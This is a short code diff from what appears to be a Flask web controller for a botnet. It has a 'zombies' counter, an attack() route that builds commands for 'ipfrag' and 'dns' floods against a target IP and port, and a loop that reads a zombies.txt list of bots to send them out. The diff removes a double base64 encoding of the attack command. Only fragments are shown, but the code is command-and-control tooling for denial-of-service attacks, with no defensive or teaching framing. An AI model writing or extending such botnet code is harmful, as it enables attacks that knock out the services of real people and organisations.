@@ -5,6 +5,7 @@ from urllib.parse import urlparse
 import socket
 import subprocess
 
+
 zombies = 0
 
 app = Flask(__name__)
@@ -88,10 +89,6 @@ def attack():
         command = f" echo {target_ip} {port} ipfrag | "
     if attack_type == 'dns':
         command = f" echo {target_ip} {port} dns | "
-
-    command = encoded_twice = base64.b64encode(base64.b64encode(command.encode())).decode()
-
-    print(command)
 
     with open('zombies.txt', 'r') as f:
        for line in f:
